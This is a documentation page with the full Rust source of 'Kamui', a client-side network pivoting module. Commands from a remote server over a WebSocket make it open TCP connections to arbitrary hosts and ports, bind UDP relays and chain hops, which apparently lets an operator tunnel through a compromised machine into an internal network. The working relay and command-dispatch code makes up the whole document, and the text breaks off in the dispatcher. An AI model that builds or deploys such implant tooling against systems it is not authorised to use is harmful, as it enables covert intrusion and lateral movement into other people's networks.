# Kamui (神威) — Network pivoting engine (client side).

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/kamui.rs` |
| **Lines** | 1231 |
| **Cards** | T019-networking |
| **Role** | SOCKS5 proxy |

## Purpose

Kamui (神威) — Network pivoting engine (client side).

Manages TCP connections on behalf of the server's SOCKS5 proxy.
Each stream_id maps to one TCP connection. Data is relayed
bidirectionally between the TCP socket and the WebSocket.

Message types (bidirectional):
0x30 MSG_KAMUI_TCP_DATA:   [4B stream_id BE][tcp_data]
0x31 MSG_KAMUI_TCP_OPEN:   JSON {stream_id, host, port} (server→client)
0x32 MSG_KAMUI_TCP_CLOSE:  JSON {stream_id, reason?}
0x33 MSG_KAMUI_TCP_PAUSE:  JSON {stream_id}
0x34 MSG_KAMUI_TCP_RESUME: JSON {stream_id}
0x35 MSG_KAMUI_TCP_ERROR:  JSON {stream_id, error} (client→server)

## Constants

- `MSG_KAMUI_TCP_DATA`: `u8` = `0x30`
- `MSG_KAMUI_TCP_OPEN`: `u8` = `0x31`
- `MSG_KAMUI_TCP_CLOSE`: `u8` = `0x32`
- `MSG_KAMUI_TCP_PAUSE`: `u8` = `0x33`
- `MSG_KAMUI_TCP_RESUME`: `u8` = `0x34`
- `MSG_KAMUI_TCP_ERROR`: `u8` = `0x35`
- `MSG_KAMUI_UDP_BIND`: `u8` = `0x36`
- `MSG_KAMUI_UDP_DATA`: `u8` = `0x37`
- `MSG_KAMUI_UDP_CLOSE`: `u8` = `0x38`
- `MSG_KAMUI_CHAIN_DATA`: `u8` = `0x39`
- `TCP_READ_BUF_SIZE`: `usize` = `32768`
- `INBOUND_CHANNEL_CAPACITY`: `usize` = `256`
- `CONNECT_TIMEOUT_SECS`: `u64` = `10`

## Types

### struct `KamuiUdpRelay` (line 96)

### struct `KamuiChainStream` (line 104)

### struct `KamuiStream` (line 113)
Represents a single proxied TCP connection.

### struct `KamuiManager` (line 132)

### struct `TcpOpenPayload` (line 742)

### struct `TcpClosePayload` (line 749)

### struct `StreamIdPayload` (line 756)

### struct `UdpBindPayload` (line 761)

### struct `RelayIdPayload` (line 767)

### struct `ChainOpenPayload` (line 772)

### struct `ChainClosePayload` (line 780)

## Public API

### `new` (line 141)
```rust
pub fn new() -> Self
```

### `enable` (line 164)
```rust
pub fn enable(&self)
```
Enable the Kamui engine (called by KAMUI_START command).

### `is_enabled` (line 176)
```rust
pub fn is_enabled(&self) -> bool
```

### `get_manager` (line 733)
```rust
pub fn get_manager() -> Arc<KamuiManager>
```

## Internal Functions

- `build_message` (line 47)
- `build_tcp_data` (line 55)
- `build_tcp_close` (line 62)
- `build_tcp_error` (line 71)
- `build_udp_data` (line 79)
- `build_chain_data` (line 87)
- `test_build_tcp_data` (line 1142)
- `test_build_tcp_close` (line 1154)
- `test_build_tcp_error` (line 1165)
- `test_build_message_format` (line 1176)

## Key Dependencies

- `use tokio::io::{AsyncReadExt, AsyncWriteExt};`
- `use tokio::net::TcpStream;`
- `use tokio::sync::{mpsc, Mutex, Notify};`
- `use tracing::{debug, info, warn};`
- `use super::*;`

## Full Source

```rust
//! Kamui (神威) — Network pivoting engine (client side).
//!
//! Manages TCP connections on behalf of the server's SOCKS5 proxy.
//! Each stream_id maps to one TCP connection. Data is relayed
//! bidirectionally between the TCP socket and the WebSocket.
//!
//! Message types (bidirectional):
//!   0x30 MSG_KAMUI_TCP_DATA:   [4B stream_id BE][tcp_data]
//!   0x31 MSG_KAMUI_TCP_OPEN:   JSON {stream_id, host, port} (server→client)
//!   0x32 MSG_KAMUI_TCP_CLOSE:  JSON {stream_id, reason?}
//!   0x33 MSG_KAMUI_TCP_PAUSE:  JSON {stream_id}
//!   0x34 MSG_KAMUI_TCP_RESUME: JSON {stream_id}
//!   0x35 MSG_KAMUI_TCP_ERROR:  JSON {stream_id, error} (client→server)

use std::collections::HashMap;
use std::sync::{Arc, OnceLock};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex, Notify};
use tracing::{debug, info, warn};

// --- Protocol constants ---

pub const MSG_KAMUI_TCP_DATA: u8 = 0x30;
pub const MSG_KAMUI_TCP_OPEN: u8 = 0x31;
pub const MSG_KAMUI_TCP_CLOSE: u8 = 0x32;
pub const MSG_KAMUI_TCP_PAUSE: u8 = 0x33;
pub const MSG_KAMUI_TCP_RESUME: u8 = 0x34;
pub const MSG_KAMUI_TCP_ERROR: u8 = 0x35;
pub const MSG_KAMUI_UDP_BIND: u8 = 0x36;
pub const MSG_KAMUI_UDP_DATA: u8 = 0x37;
pub const MSG_KAMUI_UDP_CLOSE: u8 = 0x38;
pub const MSG_KAMUI_CHAIN_DATA: u8 = 0x39;

/// Max bytes per TCP read operation.
const TCP_READ_BUF_SIZE: usize = 32768;

/// Inbound channel capacity (WS → TCP write direction).
/// If the channel fills up, we signal the server to close the stream.
const INBOUND_CHANNEL_CAPACITY: usize = 256;

/// TCP connect timeout in seconds.
const CONNECT_TIMEOUT_SECS: u64 = 10;

// --- Message builders ---

fn build_message(msg_type: u8, payload: &[u8]) -> Vec<u8> {
    let mut msg = Vec::with_capacity(5 + payload.len());
    msg.push(msg_type);
    msg.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    msg.extend_from_slice(payload);
    msg
}

fn build_tcp_data(stream_id: u32, data: &[u8]) -> Vec<u8> {
    let mut payload = Vec::with_capacity(4 + data.len());
    payload.extend_from_slice(&stream_id.to_be_bytes());
    payload.extend_from_slice(data);
    build_message(MSG_KAMUI_TCP_DATA, &payload)
}

fn build_tcp_close(stream_id: u32, reason: Option<&str>) -> Vec<u8> {
    let json = if let Some(r) = reason {
        serde_json::json!({ "stream_id": stream_id, "reason": r })
    } else {
        serde_json::json!({ "stream_id": stream_id })
    };
    build_message(MSG_KAMUI_TCP_CLOSE, json.to_string().as_bytes())
}

fn build_tcp_error(stream_id: u32, error_msg: &str) -> Vec<u8> {
    let json = serde_json::json!({
        "stream_id": stream_id,
        "error": error_msg,
    });
    build_message(MSG_KAMUI_TCP_ERROR, json.to_string().as_bytes())
}

fn build_udp_data(relay_id: u32, src_port: u16, data: &[u8]) -> Vec<u8> {
    let mut payload = Vec::with_capacity(6 + data.len());
    payload.extend_from_slice(&relay_id.to_be_bytes());
    payload.extend_from_slice(&src_port.to_be_bytes());
    payload.extend_from_slice(data);
    build_message(MSG_KAMUI_UDP_DATA, &payload)
}

fn build_chain_data(chain_stream_id: u32, data: &[u8]) -> Vec<u8> {
    let mut payload = Vec::with_capacity(4 + data.len());
    payload.extend_from_slice(&chain_stream_id.to_be_bytes());
    payload.extend_from_slice(data);
    build_message(MSG_KAMUI_CHAIN_DATA, &payload)
}

// --- UDP relay state ---

struct KamuiUdpRelay {
    relay_id: u32,
    socket: Arc<tokio::net::UdpSocket>,
    abort_handle: tokio::task::JoinHandle<()>,
}

// --- Chain state ---

struct KamuiChainStream {
    chain_stream_id: u32,
    /// Delegates to the underlying TCP stream manager
    target_stream_id: u32,
}

// --- Stream state ---

/// Represents a single proxied TCP connection.
struct KamuiStream {
    stream_id: u32,
    target: String,
    /// Send WS data into this channel to be written to the TCP socket.
    inbound_tx: mpsc::Sender<Vec<u8>>,
    /// Handle for the combined read+write task; aborting this drops both halves.
    abort_handle: tokio::task::JoinHandle<()>,
    /// Notifier for resuming a paused read task.
    resume_notify: Arc<Notify>,
    /// Atomic flag: when true the read task should pause.
    paused: Arc<std::sync::atomic::AtomicBool>,
    /// Bytes read from TCP and sent to WS (upstream).
    bytes_up: Arc<std::sync::atomic::AtomicU64>,
    /// Bytes received from WS and written to TCP (downstream).
    bytes_down: Arc<std::sync::atomic::AtomicU64>,
}

// --- Manager ---

pub struct KamuiManager {
    streams: Arc<Mutex<HashMap<u32, KamuiStream>>>,
    udp_relays: Arc<Mutex<HashMap<u32, KamuiUdpRelay>>>,
    chain_streams: Arc<Mutex<HashMap<u32, KamuiChainStream>>>,
    ws_tx: Arc<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>>,
    enabled: Arc<std::sync::atomic::AtomicBool>,
}

impl KamuiManager {
    pub fn new() -> Self {
        KamuiManager {
            streams: Arc::new(Mutex::new(HashMap::new())),
            udp_relays: Arc::new(Mutex::new(HashMap::new())),
            chain_streams: Arc::new(Mutex::new(HashMap::new())),
            ws_tx: Arc::new(Mutex::new(None)),
            enabled: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        }
    }

    /// Set (or replace) the WebSocket sender used to push data back to the server.
    pub async fn set_ws_sender(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
        let mut guard = self.ws_tx.lock().await;
        *guard = Some(tx);
    }

    /// Clear the WS sender (e.g. on disconnect).
    pub async fn clear_ws_sender(&self) {
        let mut guard = self.ws_tx.lock().await;
        *guard = None;
    }

    /// Enable the Kamui engine (called by KAMUI_START command).
    pub fn enable(&self) {
        self.enabled.store(true, std::sync::atomic::Ordering::SeqCst);
        info!("[kamui] Engine enabled");
    }

    /// Disable the Kamui engine and close all streams.
    pub async fn disable(&self) {
        self.enabled.store(false, std::sync::atomic::Ordering::SeqCst);
        self.close_all().await;
        info!("[kamui] Engine disabled");
    }

    pub fn is_enabled(&self) -> bool {
        self.enabled.load(std::sync::atomic::Ordering::SeqCst)
    }

    /// Handle a KAMUI_TCP_OPEN request from the server.
    ///
    /// Connects to `host:port` via TCP, spawns relay tasks, and registers the stream.
    pub async fn handle_tcp_open(&self, stream_id: u32, host: &str, port: u16) {
        if !self.is_enabled() {
            warn!("[kamui] TCP_OPEN for stream {} ignored — engine disabled", stream_id);
            self.send_ws_msg(build_tcp_error(stream_id, "kamui engine disabled")).await;
            return;
        }

        let target = format!("{}:{}", host, port);
        info!("[kamui] Opening TCP connection: stream_id={}, target={}", stream_id, target);

        // Check for duplicate stream_id
        {
            let streams = self.streams.lock().await;
            if streams.contains_key(&stream_id) {
                warn!("[kamui] Duplicate stream_id {}, closing old stream first", stream_id);
                drop(streams);
                self.handle_tcp_close(stream_id).await;
            }
        }

        // Connect with timeout
        let tcp_stream = match tokio::time::timeout(
            std::time::Duration::from_secs(CONNECT_TIMEOUT_SECS),
            TcpStream::connect(&target),
        )
        .await
        {
            Ok(Ok(stream)) => stream,
            Ok(Err(e)) => {
                warn!("[kamui] TCP connect failed for stream {}: {}", stream_id, e);
                self.send_ws_msg(build_tcp_error(stream_id, &format!("connect failed: {}", e)))
                    .await;
                return;
            }
            Err(_) => {
                warn!("[kamui] TCP connect timed out for stream {} ({}s)", stream_id, CONNECT_TIMEOUT_SECS);
                self.send_ws_msg(build_tcp_error(stream_id, "connect timed out"))
                    .await;
                return;
            }
        };

        // Disable Nagle's algorithm for lower latency
        if let Err(e) = tcp_stream.set_nodelay(true) {
            debug!("[kamui] Failed to set TCP_NODELAY for stream {}: {}", stream_id, e);
        }

        info!("[kamui] Connected to {} for stream {}", target, stream_id);

        // Split TCP stream
        let (tcp_reader, tcp_writer) = tcp_stream.into_split();

        // Create the inbound channel (WS → TCP write)
        let (inbound_tx, inbound_rx) = mpsc::channel::<Vec<u8>>(INBOUND_CHANNEL_CAPACITY);

        // Backpressure state
        let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let resume_notify = Arc::new(Notify::new());

        // Byte counters
        let bytes_up = Arc::new(std::sync::atomic::AtomicU64::new(0));
        let bytes_down = Arc::new(std::sync::atomic::AtomicU64::new(0));

        // Clone what the tasks need
        let ws_tx_ref = self.ws_tx.clone();
        let streams_ref = self.streams.clone();
        let paused_clone = paused.clone();
        let resume_clone = resume_notify.clone();
        let bytes_up_clone = bytes_up.clone();
        let bytes_down_clone = bytes_down.clone();
        let target_clone = target.clone();

        // Spawn a single combined task that owns both the read and write halves.
        // When either half finishes, the other is cancelled via select!.
        let abort_handle = tokio::spawn(async move {
            let read_fut = Self::tcp_read_task(
                stream_id,
                tcp_reader,
                ws_tx_ref.clone(),
                paused_clone,
                resume_clone,
                bytes_up_clone,
            );
            let write_fut = Self::tcp_write_task(
                stream_id,
                tcp_writer,
                inbound_rx,
                ws_tx_ref.clone(),
                bytes_down_clone,
            );

            // Run both directions concurrently; when one finishes, cancel the other.
            tokio::select! {
                _ = read_fut => {
                    debug!("[kamui] Read task finished for stream {}", stream_id);
                }
                _ = write_fut => {
                    debug!("[kamui] Write task finished for stream {}", stream_id);
                }
            }

            // Clean up: remove from the streams map
            let mut streams = streams_ref.lock().await;
            if streams.remove(&stream_id).is_some() {
                debug!("[kamui] Stream {} removed from map (task exit)", stream_id);
            }

            info!("[kamui] Stream {} ({}) closed", stream_id, target_clone);
        });

        // Register the stream
        let stream = KamuiStream {
            stream_id,
            target,
            inbound_tx,
            abort_handle,
            resume_notify,
            paused,
            bytes_up,
            bytes_down,
        };

        let mut streams = self.streams.lock().await;
        streams.insert(stream_id, stream);
    }

    /// Handle incoming TCP data from the WebSocket (to be written to the TCP socket).
    pub async fn handle_tcp_data(&self, stream_id: u32, data: Vec<u8>) {
        let streams = self.streams.lock().await;
        if let Some(stream) = streams.get(&stream_id) {
            match stream.inbound_tx.try_send(data) {
                Ok(()) => {}
                Err(mpsc::error::TrySendError::Full(_)) => {
                    warn!(
                        "[kamui] Inbound channel full for stream {} ({} items) — closing",
                        stream_id, INBOUND_CHANNEL_CAPACITY
                    );
                    drop(streams);
                    self.send_ws_msg(build_tcp_close(stream_id, Some("inbound buffer overflow")))
                        .await;
                    self.handle_tcp_close(stream_id).await;
                }
                Err(mpsc::error::TrySendError::Closed(_)) => {
                    debug!("[kamui] Inbound channel closed for stream {}", stream_id);
                    drop(streams);
                    self.send_ws_msg(build_tcp_close(stream_id, Some("stream closed")))
                        .await;
                    self.handle_tcp_close(stream_id).await;
                }
            }
        } else {
            debug!("[kamui] Data for unknown stream {}, sending close", stream_id);
            drop(streams);
            self.send_ws_msg(build_tcp_close(stream_id, Some("unknown stream")))
                .await;
        }
    }

    /// Handle a TCP_CLOSE message from the server (or internal close request).
    pub async fn handle_tcp_close(&self, stream_id: u32) {
        let mut streams = self.streams.lock().await;
        if let Some(stream) = streams.remove(&stream_id) {
            debug!("[kamui] Closing stream {} (target={})", stream_id, stream.target);
            // Drop the inbound sender to signal the write task to stop
            drop(stream.inbound_tx);
            // Abort the combined task
            stream.abort_handle.abort();
            info!(
                "[kamui] Stream {} closed (up={} bytes, down={} bytes)",
                stream_id,
                stream.bytes_up.load(std::sync::atomic::Ordering::Relaxed),
                stream.bytes_down.load(std::sync::atomic::Ordering::Relaxed),
            );
        } else {
            debug!("[kamui] Close for unknown stream {}", stream_id);
        }
    }

    /// Handle a TCP_PAUSE message: pause TCP reads for backpressure.
    pub async fn handle_tcp_pause(&self, stream_id: u32) {
        let streams = self.streams.lock().await;
        if let Some(stream) = streams.get(&stream_id) {
            stream.paused.store(true, std::sync::atomic::Ordering::SeqCst);
            debug!("[kamui] Stream {} paused", stream_id);
        } else {
            debug!("[kamui] Pause for unknown stream {}", stream_id);
        }
    }

    /// Handle a TCP_RESUME message: resume TCP reads.
    pub async fn handle_tcp_resume(&self, stream_id: u32) {
        let streams = self.streams.lock().await;
        if let Some(stream) = streams.get(&stream_id) {
            stream.paused.store(false, std::sync::atomic::Ordering::SeqCst);
            stream.resume_notify.notify_one();
            debug!("[kamui] Stream {} resumed", stream_id);
        } else {
            debug!("[kamui] Resume for unknown stream {}", stream_id);
        }
    }

    // ──────────────────────────────────────────────────────────────
    // UDP relay handlers
    // ──────────────────────────────────────────────────────────────

    /// Handle a KAMUI_UDP_BIND request from the server.
    ///
    /// Binds a local UDP socket on `bind_port`, spawns a recv loop that
    /// forwards incoming datagrams to the server via MSG_KAMUI_UDP_DATA.
    pub async fn handle_udp_bind(&self, relay_id: u32, bind_port: u16) {
        if !self.is_enabled() {
            warn!("[kamui] UDP_BIND for relay {} ignored — engine disabled", relay_id);
            return;
        }

        // Check for duplicate relay_id
        {
            let relays = self.udp_relays.lock().await;
            if relays.contains_key(&relay_id) {
                warn!("[kamui] Duplicate relay_id {}, closing old relay first", relay_id);
                drop(relays);
                self.handle_udp_close(relay_id).await;
            }
        }

        let bind_addr = format!("0.0.0.0:{}", bind_port);
        let socket = match tokio::net::UdpSocket::bind(&bind_addr).await {
            Ok(s) => Arc::new(s),
            Err(e) => {
                warn!("[kamui] UDP bind failed for relay {} on {}: {}", relay_id, bind_addr, e);
                // Notify server of failure
                let err_json = serde_json::json!({
                    "relay_id": relay_id,
                    "error": format!("bind failed: {}", e),
                });
                self.send_ws_msg(build_message(
                    MSG_KAMUI_UDP_CLOSE,
                    err_json.to_string().as_bytes(),
                )).await;
                return;
            }
        };

        info!("[kamui] UDP relay {} bound on {}", relay_id, bind_addr);

        let ws_tx_ref = self.ws_tx.clone();
        let socket_clone = socket.clone();

        // Spawn recv loop: read datagrams from the local socket and forward to server
        let abort_handle = tokio::spawn(async move {
            let mut buf = vec![0u8; 65536]; // Max UDP datagram
            loop {
                match socket_clone.recv_from(&mut buf).await {
                    Ok((n, src_addr)) => {
                        let src_port = src_addr.port();
                        let msg = build_udp_data(relay_id, src_port, &buf[..n]);
                        let guard = ws_tx_ref.lock().await;
                        if let Some(ref tx) = *guard {
                            if tx.send(msg).is_err() {
                                debug!("[kamui] UDP relay {} WS send failed, stopping", relay_id);
                                break;
                            }
                        } else {
                            debug!("[kamui] UDP relay {} no WS sender, stopping", relay_id);
                            break;
                        }
                    }
                    Err(e) => {
                        warn!("[kamui] UDP relay {} recv error: {}", relay_id, e);
                        break;
                    }
                }
            }
        });

        let relay = KamuiUdpRelay {
            relay_id,
            socket,
            abort_handle,
        };

        let mut relays = self.udp_relays.lock().await;
        relays.insert(relay_id, relay);
    }

    /// Handle incoming UDP data from the server (to be sent out the local socket).
    ///
    /// Payload format: [4B relay_id BE][2B dst_port BE][data]
    pub async fn handle_udp_data(&self, relay_id: u32, dst_port: u16, data: Vec<u8>) {
        let relays = self.udp_relays.lock().await;
        if let Some(relay) = relays.get(&relay_id) {
            let dst_addr = format!("127.0.0.1:{}", dst_port);
            if let Err(e) = relay.socket.send_to(&data, &dst_addr).await {
                warn!("[kamui] UDP relay {} send_to {} failed: {}", relay_id, dst_addr, e);
            }
        } else {
            debug!("[kamui] UDP data for unknown relay {}", relay_id);
        }
    }

    /// Handle a UDP_CLOSE message: stop the relay and release the socket.
    pub async fn handle_udp_close(&self, relay_id: u32) {
        let mut relays = self.udp_relays.lock().await;
        if let Some(relay) = relays.remove(&relay_id) {
            relay.abort_handle.abort();
            info!("[kamui] UDP relay {} closed", relay_id);
        } else {
            debug!("[kamui] UDP close for unknown relay {}", relay_id);
        }
    }

    // ──────────────────────────────────────────────────────────────
    // Multi-hop chain handlers
    // ──────────────────────────────────────────────────────────────

    /// Handle a KAMUI_CHAIN_DATA message: forward data to the underlying TCP stream.
    ///
    /// Chain streams are virtual IDs that map to real TCP stream_ids.
    /// The server sends data tagged with chain_stream_id, and we forward it
    /// to the target_stream_id's TCP connection.
    pub async fn handle_chain_data(&self, chain_stream_id: u32, data: Vec<u8>) {
        // First check if we have a chain mapping
        let target_stream_id = {
            let chains = self.chain_streams.lock().await;
            chains.get(&chain_stream_id).map(|c| c.target_stream_id)
        };

        if let Some(target_id) = target_stream_id {
            // Forward to the real TCP stream
            self.handle_tcp_data(target_id, data).await;
        } else {
            // No chain mapping — treat chain_stream_id as a direct stream_id
            // This supports simple forwarding where chain_id == stream_id
            self.handle_tcp_data(chain_stream_id, data).await;
        }
    }

    /// Register a chain mapping: chain_stream_id → target_stream_id
    pub async fn register_chain(&self, chain_stream_id: u32, target_stream_id: u32) {
        let chain = KamuiChainStream {
            chain_stream_id,
            target_stream_id,
        };
        let mut chains = self.chain_streams.lock().await;
        chains.insert(chain_stream_id, chain);
        info!(
            "[kamui] Chain registered: {} → stream {}",
            chain_stream_id, target_stream_id
        );
    }

    /// Remove a chain mapping.
    pub async fn unregister_chain(&self, chain_stream_id: u32) {
        let mut chains = self.chain_streams.lock().await;
        if chains.remove(&chain_stream_id).is_some() {
            info!("[kamui] Chain {} unregistered", chain_stream_id);
        }
    }

    /// Close all active streams, UDP relays, and chain mappings.
    pub async fn close_all(&self) {
        // Close TCP streams
        let mut streams = self.streams.lock().await;
        let tcp_count = streams.len();
        for (id, stream) in streams.drain() {
            drop(stream.inbound_tx);
            stream.abort_handle.abort();
            debug!("[kamui] Force-closed stream {} (close_all)", id);
        }
        drop(streams);

        // Close UDP relays
        let mut relays = self.udp_relays.lock().await;
        let udp_count = relays.len();
        for (id, relay) in relays.drain() {
            relay.abort_handle.abort();
            debug!("[kamui] Force-closed UDP relay {} (close_all)", id);
        }
        drop(relays);

        // Clear chain mappings
        let mut chains = self.chain_streams.lock().await;
        let chain_count = chains.len();
        chains.clear();
        drop(chains);

        if tcp_count + udp_count + chain_count > 0 {
            info!(
                "[kamui] Closed all: {} TCP streams, {} UDP relays, {} chains",
                tcp_count, udp_count, chain_count
            );
        }
    }

    /// Return the number of active streams.
    pub async fn active_stream_count(&self) -> usize {
        self.streams.lock().await.len()
    }

    /// Return stats for all active streams (for status reporting).
    pub async fn stream_stats(&self) -> Vec<serde_json::Value> {
        let streams = self.streams.lock().await;
        streams
            .values()
            .map(|s| {
                serde_json::json!({
                    "stream_id": s.stream_id,
                    "target": s.target,
                    "paused": s.paused.load(std::sync::atomic::Ordering::Relaxed),
                    "bytes_up": s.bytes_up.load(std::sync::atomic::Ordering::Relaxed),
                    "bytes_down": s.bytes_down.load(std::sync::atomic::Ordering::Relaxed),
                })
            })
            .collect()
    }

    /// Return stats for UDP relays.
    pub async fn udp_relay_stats(&self) -> Vec<serde_json::Value> {
        let relays = self.udp_relays.lock().await;
        relays
            .values()
            .map(|r| {
                serde_json::json!({
                    "relay_id": r.relay_id,
                    "active": !r.abort_handle.is_finished(),
                })
            })
            .collect()
    }

    /// Return chain mappings.
    pub async fn chain_stats(&self) -> Vec<serde_json::Value> {
        let chains = self.chain_streams.lock().await;
        chains
            .values()
            .map(|c| {
                serde_json::json!({
                    "chain_stream_id": c.chain_stream_id,
                    "target_stream_id": c.target_stream_id,
                })
            })
            .collect()
    }

    // ---- Internal: TCP read task (TCP → WS) ----

    async fn tcp_read_task(
        stream_id: u32,
        mut tcp_reader: tokio::net::tcp::OwnedReadHalf,
        ws_tx: Arc<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>>,
        paused: Arc<std::sync::atomic::AtomicBool>,
        resume_notify: Arc<Notify>,
        bytes_up: Arc<std::sync::atomic::AtomicU64>,
    ) {
        let mut buf = vec![0u8; TCP_READ_BUF_SIZE];

        loop {
            // Check backpressure: if paused, wait for resume notification
            while paused.load(std::sync::atomic::Ordering::SeqCst) {
                debug!("[kamui] Stream {} read paused, waiting for resume", stream_id);
                resume_notify.notified().await;
            }

            match tcp_reader.read(&mut buf).await {
                Ok(0) => {
                    // TCP connection closed by remote
                    debug!("[kamui] Stream {} TCP read EOF", stream_id);
                    Self::send_ws_static(&ws_tx, build_tcp_close(stream_id, Some("remote closed")))
                        .await;
                    break;
                }
                Ok(n) => {
                    bytes_up.fetch_add(n as u64, std::sync::atomic::Ordering::Relaxed);
                    let msg = build_tcp_data(stream_id, &buf[..n]);
                    if !Self::send_ws_static(&ws_tx, msg).await {
                        debug!("[kamui] Stream {} WS send failed, stopping read", stream_id);
                        break;
                    }
                }
                Err(e) => {
                    warn!("[kamui] Stream {} TCP read error: {}", stream_id, e);
                    Self::send_ws_static(
                        &ws_tx,
                        build_tcp_error(stream_id, &format!("read error: {}", e)),
                    )
                    .await;
                    break;
                }
            }
        }
    }

    // ---- Internal: TCP write task (WS → TCP) ----

    async fn tcp_write_task(
        stream_id: u32,
        mut tcp_writer: tokio::net::tcp::OwnedWriteHalf,
        mut inbound_rx: mpsc::Receiver<Vec<u8>>,
        ws_tx: Arc<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>>,
        bytes_down: Arc<std::sync::atomic::AtomicU64>,
    ) {
        while let Some(data) = inbound_rx.recv().await {
            let len = data.len();
            if let Err(e) = tcp_writer.write_all(&data).await {
                warn!("[kamui] Stream {} TCP write error: {}", stream_id, e);
                Self::send_ws_static(
                    &ws_tx,
                    build_tcp_close(stream_id, Some(&format!("write error: {}", e))),
                )
                .await;
                break;
            }
            bytes_down.fetch_add(len as u64, std::sync::atomic::Ordering::Relaxed);
        }
        // Channel closed — stream is being torn down, nothing more to do.
        debug!("[kamui] Stream {} write task finished (channel closed)", stream_id);
    }

    // ---- Internal: send a message via the WS sender ----

    async fn send_ws_msg(&self, msg: Vec<u8>) {
        let guard = self.ws_tx.lock().await;
        if let Some(ref tx) = *guard {
            if tx.send(msg).is_err() {
                debug!("[kamui] WS sender closed");
            }
        } else {
            debug!("[kamui] No WS sender available");
        }
    }

    /// Static version for use inside spawned tasks that hold an Arc<Mutex<Option<...>>>.
    /// Returns true if the message was sent successfully.
    async fn send_ws_static(
        ws_tx: &Arc<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>>,
        msg: Vec<u8>,
    ) -> bool {
        let guard = ws_tx.lock().await;
        if let Some(ref tx) = *guard {
            tx.send(msg).is_ok()
        } else {
            false
        }
    }
}

// --- Singleton ---

static KAMUI: OnceLock<Arc<KamuiManager>> = OnceLock::new();

pub fn get_manager() -> Arc<KamuiManager> {
    KAMUI
        .get_or_init(|| Arc::new(KamuiManager::new()))
        .clone()
}

// --- JSON payloads for command parsing ---

#[derive(serde::Deserialize)]
struct TcpOpenPayload {
    stream_id: u32,
    host: String,
    port: u16,
}

#[derive(serde::Deserialize)]
struct TcpClosePayload {
    stream_id: u32,
    #[serde(default)]
    reason: Option<String>,
}

#[derive(serde::Deserialize)]
struct StreamIdPayload {
    stream_id: u32,
}

#[derive(serde::Deserialize)]
struct UdpBindPayload {
    relay_id: u32,
    bind_port: u16,
}

#[derive(serde::Deserialize)]
struct RelayIdPayload {
    relay_id: u32,
}

#[derive(serde::Deserialize)]
struct ChainOpenPayload {
    chain_stream_id: u32,
    target_stream_id: u32,
    host: String,
    port: u16,
}

#[derive(serde::Deserialize)]
struct ChainClosePayload {
    chain_stream_id: u32,
}

// --- Top-level dispatcher (called from main.rs) ---

/// Dispatch a Kamui command received via MSG_COMMAND (0x10).
///
/// `cmd_type` is the command name (e.g. "KAMUI_TCP_OPEN", "KAMUI_START").
/// `payload` is the JSON payload string.
/// `ws_tx` is the WebSocket sender for bootstrapping the engine.
///
/// Returns a list of response messages to send back (may be empty).
pub async fn dispatch(
    cmd_type: &str,
    payload: &str,
    ws_tx: &mpsc::UnboundedSender<Vec<u8>>,
) -> Vec<Vec<u8>> {
    let manager = get_manager();

    match cmd_type {
        "KAMUI_START" => {
            manager.set_ws_sender(ws_tx.clone()).await;
            manager.enable();
            let count = manager.active_stream_count().await;
            info!("[kamui] KAMUI_START processed ({} existing streams)", count);
            Vec::new()
        }

        "KAMUI_STOP" => {
            manager.disable().await;
            info!("[kamui] KAMUI_STOP processed — all streams closed");
            Vec::new()
        }

        "KAMUI_STATUS" => {
            let enabled = manager.is_enabled();
            let streams = manager.stream_stats().await;
            let udp_relays = manager.udp_relay_stats().await;
            let chains = manager.chain_stats().await;
            let status = serde_json::json!({
                "enabled": enabled,
                "stream_count": streams.len(),
                "streams": streams,
                "udp_relay_count": udp_relays.len(),
                "udp_relays": udp_relays,
                "chain_count": chains.len(),
                "chains": chains,
            });
            let msg = build_message(
                crate::protocol::MSG_CMD_OUTPUT,
                serde_json::json!({
                    "requestId": "KAMUI_STATUS",
                    "exitCode": 0,
                    "stdout": status.to_string(),
                    "stderr": "",
                })
                .to_string()
                .as_bytes(),
            );
            vec![msg]
        }

        "KAMUI_TCP_OPEN" => {
            match serde_json::from_str::<TcpOpenPayload>(payload) {
                Ok(req) => {
                    // Ensure WS sender is set (in case KAMUI_START was implicit)
                    {
                        let guard = manager.ws_tx.lock().await;
                        if guard.is_none() {
                            drop(guard);
                            manager.set_ws_sender(ws_tx.clone()).await;
                            if !manager.is_enabled() {
                                manager.enable();
                            }
                        }
                    }
                    manager
                        .handle_tcp_open(req.stream_id, &req.host, req.port)
                        .await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_TCP_OPEN payload: {}", e);
                }
            }
            Vec::new()
        }

        "KAMUI_TCP_CLOSE" => {
            match serde_json::from_str::<TcpClosePayload>(payload) {
                Ok(req) => {
                    manager.handle_tcp_close(req.stream_id).await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_TCP_CLOSE payload: {}", e);
                }
            }
            Vec::new()
        }

        "KAMUI_TCP_PAUSE" => {
            match serde_json::from_str::<StreamIdPayload>(payload) {
                Ok(req) => {
                    manager.handle_tcp_pause(req.stream_id).await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_TCP_PAUSE payload: {}", e);
                }
            }
            Vec::new()
        }

        "KAMUI_TCP_RESUME" => {
            match serde_json::from_str::<StreamIdPayload>(payload) {
                Ok(req) => {
                    manager.handle_tcp_resume(req.stream_id).await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_TCP_RESUME payload: {}", e);
                }
            }
            Vec::new()
        }

        "KAMUI_UDP_BIND" => {
            match serde_json::from_str::<UdpBindPayload>(payload) {
                Ok(req) => {
                    // Ensure WS sender is set
                    {
                        let guard = manager.ws_tx.lock().await;
                        if guard.is_none() {
                            drop(guard);
                            manager.set_ws_sender(ws_tx.clone()).await;
                            if !manager.is_enabled() {
                                manager.enable();
                            }
                        }
                    }
                    manager.handle_udp_bind(req.relay_id, req.bind_port).await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_UDP_BIND payload: {}", e);
                }
            }
            Vec::new()
        }

        "KAMUI_UDP_CLOSE" => {
